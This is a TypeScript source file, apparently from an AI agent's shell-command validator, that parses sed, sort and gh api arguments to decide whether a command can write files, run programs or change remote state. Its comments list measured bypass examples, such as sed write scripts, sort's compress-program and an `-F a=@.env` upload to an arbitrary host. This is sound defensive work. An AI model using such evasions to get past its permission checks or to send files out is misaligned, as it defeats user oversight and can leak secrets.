      continue;
    }
    if (word.startsWith('--expression=')) {
      scripts.push({ wordIndex: i, text: word.slice('--expression='.length) });
      sawScriptOperand = true;
      continue;
    }
    if (word.startsWith('-e') && word.length > 2) {
      scripts.push({ wordIndex: i, text: word.slice(2) });
      sawScriptOperand = true;
      continue;
    }
    if (word.startsWith('-') && word.length > 1) continue;
    if (!sawScriptOperand) { scripts.push({ wordIndex: i, text: word }); sawScriptOperand = true; }
  }
  return scripts;
}

function sedScriptTexts(words: string[]): string[] {
  return sedScripts(words).map(script => script.text);
}

/**
 * Whether a sed script carries sed's own file-WRITE primitive.
 *
 * Detection is the ABSENCE OF THE LETTER, not a parse: a script containing no
 * `w` and no `W` anywhere cannot spell `w FILE`, `W FILE` or an `s///w FILE`
 * flag. That is an invariant; hunting for the command position would be a
 * heuristic, because `w` hides after an address (`1,5w out`), after a regex
 * (`/x/w out`), after a substitution's delimiter (`s/a/b/w out`) and with no
 * space at all (`wout` writes to `out`).
 *
 * Measured cost: a read script that merely MENTIONS a `w` (`/warn/p`) is
 * refused too. Under isolation that is the safe direction, and the required
 * reads (`p`, `1,5p`, `s/a/b/p`, `/error/p`) carry no `w` at all.
 *
 * ## An UNRESOLVABLE script is a write too
 *
 * A script carrying a glob or brace metacharacter is refused for the same reason
 * an unresolvable operand is (see {@link UNRESOLVABLE_OPERAND_METACHAR}): the
 * SHELL decides what the script text becomes, and it can hand sed a `w`. Live:
 * in a directory whose alphabetically-first match starts with `w`,
 * `sed -n *.txt` expanded to `warnings.txt`, which sed parsed as `w` +
 * `arnings.txt` and CREATED that file — and sed's `w` opens and truncates its
 * target at script-compile time, so it writes with zero input lines.
 *
 * This scans only the SCRIPT texts; an unquoted glob in an INPUT position (`sed -n '1,5p' *.log`) is
 * refused by UA12.212's own rule instead ({@link unquotedGlobReason}: GNU sed reads `-i.log` as in place).
 */
export function sedScriptMayWriteFile(
  words: string[],
  shellLiteralWords: ReadonlySet<number> = new Set(),
): boolean {
  return sedScripts(words).some(script =>
    /[wW]/.test(script.text)
    || (!shellLiteralWords.has(script.wordIndex)
      && UNRESOLVABLE_OPERAND_METACHAR.test(script.text)),
  );
}

/**
 * Whether a word's ORIGINAL SOURCE proves its glob and brace metacharacters are
 * LITERAL — that the shell cannot turn this one word into several.
 *
 * The instrument is the AST plus the source span, not a character class, and
 * P2.120 is the precedent: the TEXT of `sed -n '$p' f` and of `sed -n "$p" f`
 * is identical, and only the recorded structure tells them apart. The same
 * holds one axis over. A regular expression's metacharacters ARE a glob's
 * metacharacters, so `sed -n '/foo.*bar/p' f` and `sed -n *.txt` both carry a
 * `*` in the script position — but the shell expands only the second, because
 * quoting removes pathname and brace expansion from it (POSIX
 * XCU 2.6: "the results of ... pathname expansion" happen after quote removal,
 * and a quoted character is not a pattern character). Widening or narrowing the
 * character set could not separate them; asking the SOURCE can.
 *
 * `text` is already unquoted, so the quoting only survives in the span
 * {@link WordNode.loc} names, which is why this takes the RAW slice. Both quote
 * forms count: single quotes make everything literal, double quotes still
 * remove pathname and brace expansion (a parameter expansion inside them is a
 * different axis and is already refused one layer up, by P2.120's
 * `ParameterExpansion` check). A backslash outside quotes escapes one
 * character. An UNBALANCED quote is not a proof and returns false, and so does
 * a word whose span the parse did not record — the fail-closed direction.
 */
function wordMetacharactersAreLiteral(raw: string): boolean {
  let quote: "'" | '"' | null = null;
  for (let i = 0; i < raw.length; i++) {
    const ch = raw[i];
    if (ch === undefined) continue;
    if (quote === null) {
      if (ch === '\\') { i++; continue; }
      if (ch === "'" || ch === '"') { quote = ch; continue; }
      if (UNRESOLVABLE_OPERAND_METACHAR.test(ch)) return false;
      continue;
    }
    if (quote === '"') {
      if (ch === '\\') { i++; continue; }
      if (ch === '"') quote = null;
      continue;
    }
    if (ch === "'") quote = null;
  }
  return quote === null;
}

/**
 * Commands whose OPERANDS can name a write destination, with the operand budget
 * a read may not exceed.
 *
 * One entry, and the audit behind it is the reason this is a map rather than a
 * special case: of all {@link PROVEN_READ_FLAGS} keys (audited 2026-08-24),
 * `uniq` is the ONLY command that takes an output OPERAND —
 * `uniq [OPTION]... [INPUT [OUTPUT]]` (POSIX), which TRUNCATES its second
 * operand. So `uniq` keeps its read case (`uniq`, `uniq -c`, `uniq in.txt`, and
 * the `sort f | uniq -c` pipeline idiom) and loses only the two-operand form.
 *
 * Dropping `uniq` from the proof map entirely was the alternative and was
 * measured: it closes the same escape but also refuses `uniq in.txt` and every
 * `| uniq` pipeline, which is a common isolation-time read (in a pipeline `uniq`
 * is its own Command node and would fail the proof on its own). The budget keeps
 * those.
 *
 * ## What "the budget is exact" does and does NOT mean (corrected)
 *
 * This comment used to claim the budget "is exact, because POSIX bounds the form
 * at two operands". POSIX bounds the OPERAND count; {@link operandsWithinLimit}
 * counts AST WORDS, and the shell expands one word into many operands. So the
 * budget is exact ONLY FOR LITERAL ARGV. `uniq *.txt` is one word and two
 * operands, and it TRUNCATED a real file in a live probe — as did `?.txt`,
 * `{a,b}.txt` and `<main>/*.txt`.
 *
 * The correspondence cannot be restored by counting, so a word that does not
 * resolve to exactly one operand — anything carrying a glob or brace
 * metacharacter — is UNRESOLVABLE and fails closed, the same treatment a command
 * substitution already gets.
 *
 * WHERE that check has to run is the subtle part, and the first version of this
 * comment got the rationale too strong. It said "an expansion only creates a
 * destination where an operand can BE one". That is FALSE: an expansion can also
 * make an operand BECOME A SCRIPT, which is the second exception wave 3 already
 * identified — `sed -n *.txt` expanded to `warnings.txt`, which sed read as the
 * script `w` + `arnings.txt` and created the file. So the check runs in BOTH
 * places an operand is more than an input:
 * - {@link operandsWithinLimit}, for the commands with an operand budget, where
 *   an expansion can silently supply the OUTPUT operand;
 * - {@link sedScriptMayWriteFile}, for the one script carrier, where an
 *   expansion can silently supply the SCRIPT.
 *
 * Everywhere else an operand really is only an input, which is why a glob stays
 * allowed there: `ls *.ts`, `cat *.md`, `grep -n foo src/*.ts`, and sed's own
 * input position `sed -n '1,5p' *.log` all keep working (measured).
 *
 * `valueFlags` are the flags that consume the NEXT word, so their value is not
 * miscounted as an operand (`uniq -w 5 in.txt` is one operand, not two).
 */
/**
 * The proof-map commands whose OPERANDS ARE ALL INPUTS — declared, not assumed.
 *
 * ## Why this list exists (the wave-3 caveat, closed)
 *
 * {@link PROVEN_READ_OPERAND_LIMITS} is a positive budget, so an unknown COMMAND
 * was never the failure mode. But a command added to {@link PROVEN_READ_FLAGS}
 * *without* a budget entry used to get UNRESTRICTED operands by default — which
 * is structurally the same "remember to audit" shape as the negative list wave 2
 * removed, held together only by a dated audit and a maintenance rule.
 *
 * So the operand axis is now self-closing exactly like the flag axis: every
 * proof-map key must be declared EITHER here (its operands are inputs) OR in the
 * budget map. A key in neither is NOT proven read-only and falls to the write
 * side, so adding a command without deciding this question fails closed instead
 * of silently reopening the class. {@link undeclaredProvenReadCommands} lets a
 * test name any key that drifts out of both.
 *
 * A NUMERIC restrictive default was measured first and rejected: read commands
 * legitimately take an unbounded number of INPUT files (`cat a b c`,
 * `grep -n pat a b`, `ls a b`, `wc -l *.txt`), and `git`'s subcommand is itself
 * an operand, so any cap low enough to matter refuses ordinary reads. The question
 * is not HOW MANY operands but whether an operand can BE a destination — which
 * is a per-command semantic fact, hence a declaration.
 */
const OPERANDS_ARE_INPUTS: ReadonlySet<string> = new Set([
  'ls', 'll', 'la', 'tree', 'file', 'stat', 'du', 'df', 'cat', 'head', 'tail',
  'wc', 'nl', 'less', 'more', 'bat', 'find', 'locate', 'grep', 'rg', 'ag', 'ack',
  'fd', 'which', 'whereis', 'type', 'sort', 'cut', 'tr', 'column', 'sed', 'awk',
  'gawk', 'mawk', 'nawk', 'jq', 'yq', 'xq', 'xmllint', 'json_pp', 'echo', 'pwd',
  'whoami', 'id', 'groups', 'uname', 'hostname', 'date', 'uptime', 'printenv',
  'ps', 'top', 'htop', 'free', 'vmstat', 'iostat', 'lscpu', 'lsmem', 'lsblk',
  'lsusb', 'lspci', 'git',
]);

/**
 * Proof-map keys that declare NOTHING about their operands — always empty.
 *
 * Exported for the test that pins the self-closing property: a command added to
 * {@link PROVEN_READ_FLAGS} without an operand declaration shows up here, and it
 * already fails closed in {@link commandProvenReadOnly}. The test converts that
 * silent over-block into a named failure that says what to decide.
 */
export function undeclaredProvenReadCommands(): string[] {
  return [...PROVEN_READ_FLAGS.keys()].filter(
    key => !OPERANDS_ARE_INPUTS.has(key) && !PROVEN_READ_OPERAND_LIMITS.has(key),
  );
}

export interface OperandBudget {
  readonly maxOperands: number;
  readonly valueFlags: ReadonlySet<string>;
}

const PROVEN_READ_OPERAND_LIMITS: ReadonlyMap<string, OperandBudget> = new Map([
  ['uniq', {
    maxOperands: 1,
    valueFlags: readFlags('-f -s -w --skip-fields --skip-chars --check-chars'),
  }],
]);

/**
 * Whether a command's OPERANDS prove it is a read — the declared-not-defaulted
 * axis, as a pure function.
 *
 * A budget is ENFORCED; "operands are inputs" is ACCEPTED; a command that
 * declares NEITHER is not proven read-only and falls to the write side. That
 * last branch is the self-closing property, and the two collections are
 * PARAMETERS (defaulting to the module's own declarations) purely so a test can
 * drive it with a synthetic name — the shipped declarations cover all 63 keys,
 * so nothing in the real maps can reach it.
 */
export function operandPolicyProvesRead(
  command: string,
  words: string[],
  operandsAreInputs: ReadonlySet<string> = OPERANDS_ARE_INPUTS,
  operandBudgets: ReadonlyMap<string, OperandBudget> = PROVEN_READ_OPERAND_LIMITS,
): boolean {
  const budget = operandBudgets.get(command);
  if (budget !== undefined) return operandsWithinLimit(words, budget);
  return operandsAreInputs.has(command);
}

/**
 * A glob or brace metacharacter, i.e. a word that does not resolve to exactly
 * one operand. `*` `?` `[` `]` `{` `}` — pathname expansion and brace expansion,
 * the two shell steps that turn one word into several.
 */
const UNRESOLVABLE_OPERAND_METACHAR = /[*?[\]{}]/;

/**
 * Whether a command stays inside its operand budget (see the map above).
 *
 * An operand carrying a glob or brace metacharacter is UNRESOLVABLE — the shell
 * decides its arity, not us — so it fails closed rather than counting as one.
 * This is what closes `uniq *.txt`, whose single AST word becomes two operands
 * and truncates the second.
 */
function operandsWithinLimit(words: string[], limit: OperandBudget): boolean {
  let operands = 0;
  for (let i = 1; i < words.length; i++) {
    const word = words[i];
    if (word === undefined) continue;
    if (word.startsWith('-') && word.length > 1) {
      // A flag that takes its value as the NEXT word consumes it, so the value
      // is not counted as an operand. The `--flag=value` form carries its own.
      if (!word.includes('=') && limit.valueFlags.has(word)) i++;
      continue;
    }
    if (UNRESOLVABLE_OPERAND_METACHAR.test(word)) return false;
    operands++;
  }
  return operands <= limit.maxOperands;
}

// ============================================================
// UA12.72 — argv inspectors for sed, sort and gh api (upstream v0.14.0)
// ============================================================
//
// Ported from craft-agents-oss v0.14.0 `packages/shared/src/agent/bash-validator.ts`
// (`getUnsafeSedScriptReason`, `getDangerousSedReason`, `getDangerousSortReason`,
// `readGhApiOption`, `getDangerousGhReason`; Apache-2.0, Copyright Craft Docs Ltd.),
// renamed where a name was already taken here. They sit at the END of the file
// because the docs cite this file by line (highest cited line 1759 on 2026-10-02);
// `validateCommand` and `commandBaseIsReadOnly` reach them through
// {@link argvInspectorReason}, a line-for-line change of their sed hook.
//
// Why: the anchored `default.json` regexes (`^sed\s+-n\b(?!.*\s-i)…`, `^sort\b(?!.*\s-o\b)…`,
// `^gh\s+api\b(?!.*\s-[XfF](?:[\s=]|$))…`) see only the spaced or `=` spellings, so
// `sed -n -Ei …`, `sed -n 's/a/b/w out' f`, `sed -n '1w out' f`, `sort -uo out in`,
// `sort --compress-program=./x.sh`, `gh api -XPOST …`, `gh api … -ftitle=x` and
// `gh api -H "X-HTTP-Method-Override: DELETE" …` read as read-only — Plan / Don't ask
// ran them and Ask mode showed no card (measured 2026-10-02, SEC-3 of the 1.43.0 draft).
// The regexes stay the FIRST gate (a line must match one AND pass its inspector); the
// inspectors live in code because an installed `default.json` is not narrowed on upgrade.

/**
 * The argv inspector verdict for `name` (already lower-cased): a reason when the
 * invocation writes a file, runs a program or changes remote state, `null` when it
 * is a read or `name` has no inspector. sed keeps our own `e` scanner
 * ({@link getDangerousSedReason}) first and adds upstream's print-only rule.
 */
function argvInspectorReason(name: string, commandParts: string[], node?: CommandNode): string | null {
  // From the gate (`node` given) the inspectors read the argv bash passes, not bash-parser's text ({@link shellArgv}).
  const argv = node ? shellArgv(node) : commandParts;
  if (argv === null) return `${name}: the check cannot read the words the shell passes (brace expansion, $'…' quoting or a span it did not record)`;
  switch (name) {
    case 'sed':
    case 'gsed':
      return getDangerousSedReason(argv) ?? getSedArgvWriteReason(argv);
    case 'sort':
    case 'gsort':
      return getDangerousSortReason(argv);
    case 'gh':
      return getDangerousGhReason(argv);
    case 'rg':
      return getDangerousRgReason(argv); // UA12.215 (file end)
    case 'grep':
    case 'ugrep':
    case 'ug':
      return getDangerousGrepReason(name, argv); // UA12.216 (file end): a "grep" here may be ugrep
    default:
      return null;
  }
}

/** Whether {@link argvInspectorReason} inspects `name` (already lower-cased). */
function hasArgvInspector(name: string): boolean {
  return name === 'sed' || name === 'gsed' || name === 'sort' || name === 'gsort' || name === 'gh' || name === 'rg' || name === 'grep' || name === 'ugrep' || name === 'ug';
}

/**
 * Commands that only print, or move text between the pattern and hold spaces, and so may stay in a
 * read-only script (`q`/`Q`/`l` take an optional number). Upstream v0.14.0's read-only remainder set,
 * less GNU's `v` (its argument is read like a label; the walk reads `v` alone, see below).
 */
const SED_READ_ONLY_COMMANDS = 'pPl=nNdDgGhHxqQzF';
/** Labels the GNU reading accepts: every sed ends these at the same place (anything else is refused). */
const SED_LABEL = /^[A-Za-z0-9_.-]*/;

/**
 * The readings of one script that the seds we may meet take, and the walk must find read-only under
 * EACH: GNU sed ends a label at a blank or `;` and reads `[` as an ordinary character while it looks for
 * a delimiter; BSD sed (macOS `/usr/bin/sed`) runs a label to the end of the line and skips a bracket
 * expression in an address or an `s` pattern, so `/[/]/` is ONE address there (measured 2026-10-02:
 * `sed -n '/[/s|]/w out|x|g' f` wrote `out|x|g`). The two crossed readings cover a sed between the two
 * (an older GNU reads labels to the end of the line). A reading that fails to parse refuses, so a
 * script one sed rejects is refused, not trusted to that sed's error (stated over-block: `s/[^/]*$//p`).
 */
const SED_READINGS: ReadonlyArray<{ labels: 'gnu' | 'bsd'; brackets: boolean }> = [
  { labels: 'gnu', brackets: false },
  { labels: 'bsd', brackets: true },
  { labels: 'gnu', brackets: true },
  { labels: 'bsd', brackets: false },
];

/**
 * Upstream `getUnsafeSedScriptReason`: a sed script is read-only only when it prints.
 *
 * NOT upstream's mechanism (security deviation, owner rule (b), UA12.82): upstream strips substitutions,
 * transliterations, `/re/` addresses and labels with one GLOBAL regex each, in turn, and judges what is
 * left; our port added a fourth strip for `\cREc` addresses. A construct's opening character found
 * anywhere then opened a fake one whose body ran on, across lines, and swallowed a real command:
 * `sed -n '/\|/w out<NL>/|/p' f` (our `\|` strip), `sed -n '/s|/w out<NL>/|x|/p' f` (upstream's own
 * substitution strip) and `sed -n ':a;s|<NL>w out<NL>:b|x|' f` read as read-only, and BSD sed (macOS
 * `/usr/bin/sed`) wrote `out` for each (measured 2026-10-02 at `55e7b5c34`). The script is now WALKED
 * from its first character the way sed reads it — optional address (or range), `!`, one command and
 * its arguments — so a body or a label is read only where sed reads one, under every reading in
 * {@link SED_READINGS}.
 */
function getUnsafeSedScriptReason(script: string): string | null {
  for (const reading of SED_READINGS) {
    const reason = sedScriptWalkReason(script, reading.labels, reading.brackets);
    if (reason) return reason;
  }
  return null;
}

/** {@link getUnsafeSedScriptReason} under one reading: a reason, or `null` when every command prints. */
function sedScriptWalkReason(script: string, labels: 'gnu' | 'bsd', brackets: boolean): string | null {
  const unsafe = 'sed script contains commands that may write files or run programs (only print-style commands are allowed)';
  const len = script.length;
  const isDigit = (c: string | undefined): boolean => c !== undefined && c >= '0' && c <= '9';
  const skipBlanks = (from: number): number => {
    let k = from;
    while (script[k] === ' ' || script[k] === '\t') k++;
    return k;
  };
  /** BSD `compile_ccl`: index just past the bracket expression opening at `from`, or -1 when unclosed. */
  const skipBracket = (from: number): number => {
    let k = from + 1;
    if (script[k] === '^') k++;
    if (script[k] === ']') k++;
    while (k < len && script[k] !== ']') {
      const d = script[k + 1];
      if (script[k] === '[' && (d === '.' || d === ':' || d === '=')) {
        // `[.x.]`, `[:alpha:]`, `[=e=]`: closed by `d]` at or after the first character inside.
        let p = k + 3;
        while (p < len && !(script[p] === ']' && script[p - 1] === d)) p++;
        if (p >= len) return -1;
        k = p + 1;
        continue;
      }
      k++;
    }
    return k < len ? k + 1 : -1;
  };
  /**
   * Index just past the closing `delim` (a backslash escapes the next character), or -1 when unterminated.
   * `bracketed` (a regex under the BSD reading) skips a bracket expression whole, as BSD `compile_delimited`.
   */
  const skipDelimited = (from: number, delim: string, bracketed: boolean): number => {
    for (let k = from; k < len; k++) {
      if (bracketed && script[k] === '[' && delim !== '[') {
        const end = skipBracket(k);
        if (end < 0) return -1;
        k = end - 1;
        continue;
      }
      if (script[k] === '\\') { k++; continue; }
      if (script[k] === delim) return k + 1;
    }
    return -1;
  };
  /** One address at `from`: a line number (`first~step`), `$`, `/re/` or `\cREc` with I/M; `from` when none. */
  const skipAddress = (from: number): number => {
    let k = from;
    const c = script[k];
    if (c === '$') return k + 1;
    if (isDigit(c)) {
      while (isDigit(script[k])) k++;
      if (script[k] === '~') { k++; while (isDigit(script[k])) k++; }
      return k;
    }
    if (c === '/' || c === '\\') {
      const delim = c === '/' ? '/' : script[k + 1];
      if (delim === undefined || delim === '\n' || delim === '\\') return -1;
      k = skipDelimited(c === '/' ? k + 1 : k + 2, delim, brackets);
      if (k < 0) return -1;
      while (script[k] === 'I' || script[k] === 'M') k++;
      return k;
    }
    return from;
  };
  /** Whether a command that ends at `at` is followed by nothing but a blank run and a separator. */
  const endsCleanly = (at: number): boolean => {
    const after = script[at];
    if (after !== undefined && after !== ' ' && after !== '\t' && after !== '\n' && after !== ';') return false;
    const next = script[skipBlanks(at)];
    return next === undefined || next === '\n' || next === ';' || next === '}';
  };

  let i = 0;
  while (i < len) {
    const c = script[i];
    if (c === ' ' || c === '\t' || c === '\n' || c === ';' || c === '{' || c === '}') { i++; continue; }

    // ---- optional address, optionally a range (`a,b`, `a,+N`, `a,~N`) ----
    let k = skipAddress(i);
    if (k < 0) return unsafe;
    if (k > i && script[k] === ',') {
      k++;
      if (script[k] === '+' || script[k] === '~') { k++; while (isDigit(script[k])) k++; }
      else {
        const end = skipAddress(k);
        if (end <= k) return unsafe;
        k = end;
      }
    }
    k = skipBlanks(k);
    while (script[k] === '!') k = skipBlanks(k + 1);
    i = k;

    const cmd = script[i];
    if (cmd === undefined) break;
    if (cmd === '\n' || cmd === ';' || cmd === '{' || cmd === '}') continue;
    i++;

    if (cmd === 's' || cmd === 'y') {
      const delim = script[i];
      if (delim === undefined || delim === '\n' || delim === '\\') return unsafe;
      // BSD skips a bracket expression in the `s` pattern only (not in its replacement, not in `y`).
      let end = skipDelimited(i + 1, delim, brackets && cmd === 's');
      if (end >= 0) end = skipDelimited(end, delim, false);
      if (end < 0) return unsafe;
      i = end;
      if (cmd === 'y') continue;
      while (i < len && /[gpiImMew0-9]/.test(script[i]!)) {
        if (script[i] === 'e') return 'sed s///e executes the pattern space as a shell command';
        if (script[i] === 'w') return 'sed s///w writes to a file';
        i++;
      }
      continue;
    }
    if (cmd === ':' || cmd === 'b' || cmd === 't' || cmd === 'T') {
      if (labels === 'bsd') {
        // BSD: the label is the rest of the line, whatever it holds.
        while (i < len && script[i] !== '\n') i++;
        continue;
      }
      // GNU 4.8 ends a label at a blank or `;` (so `:a}` is the label `a}`); older seds also at `}`
      // or the end of the line. Only a label every one of them ends at the same place is read.
      i = skipBlanks(i);
      i += SED_LABEL.exec(script.slice(i))![0].length;
      if (!endsCleanly(i)) return unsafe;
      continue;
    }
    if (cmd === 'v') {
      // GNU `v [version]` reads its argument like a label; only the bare command is read.
      if (!endsCleanly(i)) return unsafe;
      continue;
    }
    if (SED_READ_ONLY_COMMANDS.includes(cmd)) {
      if (cmd === 'q' || cmd === 'Q' || cmd === 'l') {
        const k2 = skipBlanks(i);
        if (isDigit(script[k2])) { i = k2; while (isDigit(script[i])) i++; }
      }
      continue;
    }
    return unsafe;
  }
  return null;
}

/**
 * Upstream `getDangerousSedReason` (renamed: ours is the `e` scanner above).
 * sed is read-only only when it prints: -i/--in-place edits files (in any flag
 * cluster: `-Ei`), `w`/`W` and s///w write files, `e` and s///e (GNU) run
 * programs, and -f/--file load a script that cannot be inspected.
 * Long options match by unambiguous prefix ({@link isLongOptionPrefix}): GNU sed's
 * `getopt_long` reads `--in=.bak` as `--in-place=.bak` and `--line 5` as `--line-length 5`.
 * NOT in upstream (security deviation, owner rule (b), UA12.72 follow-up 2): a capital `-I` is refused
 * too — BSD/macOS sed's `-I extension` edits in place (measured 2026-10-02 on `/usr/bin/sed`:
 * `sed -n -I.bak '1p' f` cut f to one line and wrote `f.bak`); GNU sed rejects `-I`, so this costs no read.
 */
function getSedArgvWriteReason(commandParts: string[]): string | null {
  const args = commandParts.slice(1);
  const scripts: string[] = [];
  let scriptFromOption = false;
  let operands = 0;
  const addOperand = (operand: string) => {
    // The first operand is the script unless -e/--expression supplied one; the rest are input files.
    if (!scriptFromOption && operands === 0) scripts.push(operand);
    operands++;
  };

  for (let i = 0; i < args.length; i++) {
    const arg = args[i]!;
    if (arg === '--') {
      args.slice(i + 1).forEach(addOperand);
      break;
    }
    if (arg.startsWith('--')) {
      const eq = arg.indexOf('=');
      const name = eq === -1 ? arg : arg.slice(0, eq);
      const inlineValue = eq === -1 ? undefined : arg.slice(eq + 1);
      if (isLongOptionPrefix(name, '--in-place', 3)) return 'sed --in-place edits files';
      if (isLongOptionPrefix(name, '--file', 3)) return 'sed --file runs a script that cannot be inspected';
      if (isLongOptionPrefix(name, '--expression', 3)) {
        scriptFromOption = true;
        scripts.push(inlineValue ?? args[++i] ?? '');
      } else if (isLongOptionPrefix(name, '--line-length', 3) && inlineValue === undefined && /^\d+$/.test(args[i + 1] ?? '')) {
        i++;
      }
      continue;
    }
    if (arg.startsWith('-') && arg.length > 1) {
      for (let j = 1; j < arg.length; j++) {
        const flag = arg[j];
        if (flag === 'i' || flag === 'I') return 'sed -i/-I edits files in place';
        if (flag === 'f') return 'sed -f runs a script that cannot be inspected';
        if (flag === 'e') {
          scriptFromOption = true;
          scripts.push(arg.slice(j + 1) || args[++i] || '');
          break;
        }
        if (flag === 'l') {
          // GNU: -l N (line-wrap length). BSD: -l takes no value.
          if (j === arg.length - 1 && /^\d+$/.test(args[i + 1] ?? '')) i++;
          break;
        }
      }
      continue;
    }
    addOperand(arg);
  }

  for (const script of scripts) {
    const reason = getUnsafeSedScriptReason(script);
    if (reason) return reason;
  }
  return null;
}

/**
 * Whether `name` (`--xyz`, no `=value`) is `option` or a prefix of it at least `minLength` characters long.
 * NOT in upstream (security deviation, owner rule (b), UA12.72 follow-up): GNU `getopt_long` and the BSD
 * sort on macOS accept any UNAMBIGUOUS prefix of a long option, so matching only the full name left
 * `sort --out=x`, `sort --compress=./x.sh` and `sed --in=.bak` read-only (measured 2026-10-02 at
 * `15309e942`; Apple sort 2.3 wrote `--outp=o1` and ran `--co=./x.sh`). `minLength` is the shortest prefix
 * refused; a shorter AMBIGUOUS one (`sort --c`: --check / --compress-program) is an error in the tool
 * itself, so nothing runs and it needs no refusal (and `sort --check` stays a read).
 */
function isLongOptionPrefix(name: string, option: string, minLength: number): boolean {
  return name.length >= minLength && option.startsWith(name);
}

/**
 * Upstream `getDangerousSortReason`: sort writes files with -o/--output and runs a program with --compress-program.
 * Long options match by unambiguous prefix ({@link isLongOptionPrefix}): `--o` is already `--output`,
 * `--co` the shortest unambiguous `--compress-program` (`--c` is ambiguous with `--check`).
 */
function getDangerousSortReason(commandParts: string[]): string | null {
  const args = commandParts.slice(1);
  for (let i = 0; i < args.length; i++) {
    const arg = args[i]!;
    if (arg === '--') break;
    if (arg.startsWith('--')) {
      const name = arg.split('=', 1)[0] ?? arg;
      if (isLongOptionPrefix(name, '--output', 3)) return 'sort --output writes to a file';
      if (isLongOptionPrefix(name, '--compress-program', 4)) return 'sort --compress-program runs an external program';
      continue;
    }
    if (arg.startsWith('-') && arg.length > 1) {
      for (let j = 1; j < arg.length; j++) {
        const flag = arg[j]!;
        if (flag === 'o') return 'sort -o writes to a file';
        // These take a value: the rest of the cluster, or the next argument.
        if ('ktST'.includes(flag)) {
          if (j === arg.length - 1) i++;
          break;
        }
      }
    }
  }
  return null;
}

/** `gh api` long options that take a value (`--name value` or `--name=value`). */
const GH_API_VALUE_OPTIONS = new Set(['cache', 'field', 'header', 'hostname', 'input', 'jq', 'method', 'preview', 'raw-field', 'template']);
/** `gh api` short options that take a value (`-X value` or `-Xvalue`), by long name. */
const GH_API_VALUE_FLAGS: Record<string, string> = {
  F: 'field', H: 'header', X: 'method', f: 'raw-field', p: 'preview', q: 'jq', t: 'template',
};

/** Upstream `readGhApiOption`: one `gh api` option split into its long name and value. */
function readGhApiOption(args: string[], index: number): { name: string; value: string; next: number } | null {
  const arg = args[index]!;
  if (arg.startsWith('--')) {
    const eq = arg.indexOf('=');
    const name = eq === -1 ? arg.slice(2) : arg.slice(2, eq);
    if (!GH_API_VALUE_OPTIONS.has(name)) return null;
    return eq === -1
      ? { name, value: args[index + 1] ?? '', next: index + 1 }
      : { name, value: arg.slice(eq + 1), next: index };
  }
  // Boolean flags (-i) may be clustered in front of a value flag: -iX DELETE, -iXDELETE.
  let j = 1;
  while (j < arg.length && !Object.hasOwn(GH_API_VALUE_FLAGS, arg[j]!)) j++;
  if (j >= arg.length) return null;
  const name = GH_API_VALUE_FLAGS[arg[j]!]!;
  return j + 1 < arg.length
    ? { name, value: arg.slice(j + 1), next: index }
    : { name, value: args[index + 1] ?? '', next: index + 1 };
}

/**
 * Upstream `getDangerousGhReason`: `gh api` is read-only only for GET requests.
 * -X/--method picks the method, and -f/-F/--field/--raw-field/--input switch
 * the default from GET to POST. GraphQL always goes over POST, so it is judged
 * by its query instead. Other `gh` subcommands are left to the allowlist.
 */
function getDangerousGhReason(commandParts: string[]): string | null {
  if (commandParts[1] !== 'api') return null;
  const args = commandParts.slice(2);
  const methods: string[] = [];
  const fields: string[] = [];
  let usesInput = false;
  let endpoint: string | undefined;

  for (let i = 0; i < args.length; i++) {
    const arg = args[i]!;
    if (!arg.startsWith('-') || arg === '-') {
      endpoint ??= arg;
      continue;
    }
    const option = readGhApiOption(args, i);
    if (!option) continue;
    i = option.next;
    const { name, value } = option;

    if (name === 'method') methods.push(value.toUpperCase());
    else if (name === 'field' || name === 'raw-field') fields.push(value);
    else if (name === 'input') usesInput = true;
    else if (name === 'header' && /x-http-method|method-override/i.test(value)) {
      return 'gh api method-override header changes the request method';
    }
  }

  // NOT upstream (security deviation, owner rule (b), UA12.88 follow-up): gh's two file-upload channels are
  // refused whatever the method. `--input <file>` sends the file as the request body, and a `-F key=@<file>`
  // field is read from the file (with GET it goes out in the query string), so `gh api -X GET
  // https://host/x -F a=@.env` sent a file the deniedPaths floor does not see (`a=@.env` is no path token
  // to it) to any host. Upstream refuses both only when no method is given; the anchored default.json entry
  // 2d9381e0c retired had refused them at the regex. A `-f`/`--raw-field` value is literal text in gh, but
  // it is refused the same way: gh is not on this host to measure, and the over-block (`-f q=@x`) is narrow.
  // Upstream's graphql `--input` and `query=@` lines below are kept for parity; this check answers first.
  if (usesInput) return 'gh api --input sends a local file as the request body';
  if (fields.some(field => /^[^=]*=@/.test(field))) return 'gh api -F key=@file sends a local file';

  if (endpoint === 'graphql') {
    if (usesInput) return 'gh api graphql --input sends a query that cannot be inspected';
    if (fields.some(field => /^query=@/.test(field))) return 'gh api graphql reads the query from a file that cannot be inspected';
    if (fields.some(field => /\bmutation\b/i.test(field))) return 'gh api graphql mutation changes remote state';
    return null;
  }

  const mutating = methods.find(method => method !== 'GET' && method !== 'HEAD');
  if (mutating) return `gh api -X ${mutating} changes remote state`;
  if (methods.length === 0 && (fields.length > 0 || usesInput)) {
    return 'gh api sends a POST request when -f/-F/--field/--raw-field/--input are used without --method GET';
  }
  return null;
}

// ============================================================
// UA12.73 — one plain command (upstream v0.14.0 `parseSimpleCommand`)
// ============================================================

/**
 * The argv of `command` when it is exactly one plain command: no `&&`/`||`/`;`/`|`
 * chains, subshells, background jobs, redirects, environment assignments or
 * expansions. `null` for anything else, including parse errors.
 *
 * For decisions about one command that must not carry over to whatever else is
 * chained onto it — the curl/wget domain grant (`core/network-command-hosts.ts`).
 * Ported from craft-agents-oss v0.14.0
 * `packages/shared/src/agent/bash-validator.ts` (Apache-2.0, Copyright Craft Docs
 * Ltd.); appended at the end of the file because the docs cite it by line.
 *
 * NOT upstream (security deviation, owner rule (b), UA12.83): upstream refuses a word
 * only for the expansions {@link checkWordForExpansions} names, so an ARITHMETIC
 * expansion passed — `$((0xCB007109))/up` stays in the argv as text the host check
 * cannot read and skips, while bash hands curl `3405803785/up`, an unlisted IP — and so
 * did the plugin-root variables that check exempts. A word carrying ANY expansion is
 * now refused: its argv text is not what the program receives.
 */
export function parseSimpleCommand(command: string): string[] | null {
  let ast: ScriptNode;
  try {
    ast = bashParser(command) as ScriptNode;
  } catch {
    return null;
  }
  if (ast.commands.length !== 1 || ast.commands[0]?.type !== 'Command') return null;
  const node = ast.commands[0] as CommandNode;
  const expands = (word: WordNode): boolean => (word.expansion?.length ?? 0) > 0;
  if (node.async || !node.name || node.prefix?.length || expands(node.name)) return null;

  const argv = [node.name.text];
  for (const item of node.suffix ?? []) {
    if (item.type !== 'Word' || expands(item as WordNode)) return null;
    argv.push((item as WordNode).text);
  }
  return argv;
